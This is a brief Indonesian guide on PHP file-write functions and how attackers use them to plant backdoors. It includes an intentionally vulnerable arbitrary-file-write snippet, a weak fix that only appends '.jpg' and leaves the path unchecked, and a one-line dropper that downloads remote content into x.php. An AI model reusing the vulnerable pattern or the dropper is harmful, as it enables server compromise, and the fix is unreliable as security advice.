# FileSystem function tips to secure that

File System function adalah sebuah fungsi dimana bahasa pemrogramman dapat, `membaca`,`mebuat`,`menghapus` ,`mengedit` sebuah berkas di dalam sebuah Mesin (OS). Hal inilah yang dapat dimanfaatkan seorang Aktor / hacker untuk menitipkan sebuah `Backdoor`. 



# Unsafe FileSystem write function

```php 
<?php 
    $input_file = $_GET['file'];
	$nama_file  = $_GET['nama'];
	$file  = fopen($nama_file, 'w+');
	fwrite($file, $input_file);
	fclose($file);
?>
```

Seperti itulah contoh kode yang tidak aman untuk sebuah system yang mana bahasa pemrogramman mengambil sebuah inputan dari user. Hal tersebut dapat dicegah dengan kita melakukan fixing input name file extension seperti berikut ini.



```php 
<?php 
    $input_file = $_GET['file'];
	$nama_file  = $_GET['nama'].".jpg";
	$file  = fopen($nama_file, 'w+');
	fwrite($file, $input_file);
	fclose($file);
?>
```

Jadi setiap input yang masuk akan berubah menjadi sebuah file `jpg`. Dan hal tersebut dapat disesuaikan sesuai kebutuhan.



# Hidden backdoor generator example

Dalam mengamankan sebuah backdoor, agar tetap terjaga, maka ada cara-cara seperti berikut ini yang harus diwaspadahi oleh tiap-tiap developer.

```php 
<?php 
file_put_contents("x.php", file_get_contents("url"));
```

Chain function di atas adalah mengambil sebuah data dari url lain lalu menaruhnya dalam sebuah file baru berupa `x.php` Cara2 lainya mirip seperti cara di atas.

